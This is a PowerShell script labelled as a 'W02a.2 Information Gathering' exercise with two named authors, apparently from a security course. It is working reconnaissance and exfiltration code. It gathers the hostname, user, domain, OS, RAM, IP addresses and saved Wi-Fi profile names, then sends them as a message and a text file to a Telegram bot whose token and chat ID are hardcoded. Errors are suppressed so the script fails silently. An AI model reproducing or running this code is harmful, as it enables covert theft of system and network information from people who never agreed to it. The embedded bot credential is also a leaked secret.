# ============================================================
#  W02a.2 – Information Gathering
#  Autoren: Raphael Bleier, Joachim Lugger
#  Exfiltration: Telegram Bot
# ============================================================

$BOT_TOKEN = "8666929583:AAHXKuc4gV1n6JMYQeoPxw3uby08GVivvgo"
$CHAT_ID   = "1780237079"

# ── Hilfsfunktionen ─────────────────────────────────────────

function Send-TgMessage {
    param([string]$Text)
    try {
        for ($i = 0; $i -lt $Text.Length; $i += 4000) {
            $chunk = $Text.Substring($i, [Math]::Min(4000, $Text.Length - $i))
            Invoke-RestMethod -Uri "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" `
                -Method POST -Body @{ chat_id = $CHAT_ID; text = $chunk } | Out-Null
            if ($Text.Length - $i -gt 4000) { Start-Sleep -Milliseconds 500 }
        }
    } catch { }
}

function Send-TgFile {
    param([string]$Filename, [string]$Content, [string]$Caption = "")
    try {
        $enc      = [System.Text.Encoding]::UTF8
        $boundary = [System.Guid]::NewGuid().ToString("N")
        $CRLF     = "`r`n"
        $header   = $enc.GetBytes(
            "--$boundary$CRLF" +
            "Content-Disposition: form-data; name=`"chat_id`"$CRLF$CRLF$CHAT_ID$CRLF" +
            "--$boundary$CRLF" +
            "Content-Disposition: form-data; name=`"caption`"$CRLF$CRLF$Caption$CRLF" +
            "--$boundary$CRLF" +
            "Content-Disposition: form-data; name=`"document`"; filename=`"$Filename`"$CRLF" +
            "Content-Type: text/plain; charset=utf-8$CRLF$CRLF"
        )
        $body = $header + $enc.GetBytes($Content) + $enc.GetBytes("$CRLF--$boundary--$CRLF")
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$BOT_TOKEN/sendDocument" `
            -Method POST `
            -ContentType "multipart/form-data; boundary=$boundary" `
            -Body $body | Out-Null
    } catch { }
}

# ── Recon ────────────────────────────────────────────────────

Send-TgMessage "🎯 [INFO GATHERING] $env:COMPUTERNAME\$env:USERNAME gestartet"

$ips  = (Get-NetIPAddress -AddressFamily IPv4 |
         Where-Object { $_.IPAddress -notlike '127*' } |
         Select-Object -ExpandProperty IPAddress) -join ', '
$wifi = (netsh wlan show profiles) -join "`n"
$os   = (Get-WmiObject Win32_OperatingSystem).Caption

$report = @"
=== INFO GATHERING | $(Get-Date -Format 'yyyy-MM-dd HH:mm') ===
Hostname : $env:COMPUTERNAME
User     : $env:USERNAME ($env:USERDOMAIN)
OS       : $os ($env:PROCESSOR_ARCHITECTURE)
RAM (GB) : $([math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB,2))
IP(s)    : $ips

=== WIFI PROFILES ===
$wifi
"@

Send-TgFile -Filename "info_$(Get-Date -Format 'yyyyMMdd_HHmm').txt" `
            -Content $report `
            -Caption "📋 Info Gathering – $env:COMPUTERNAME"
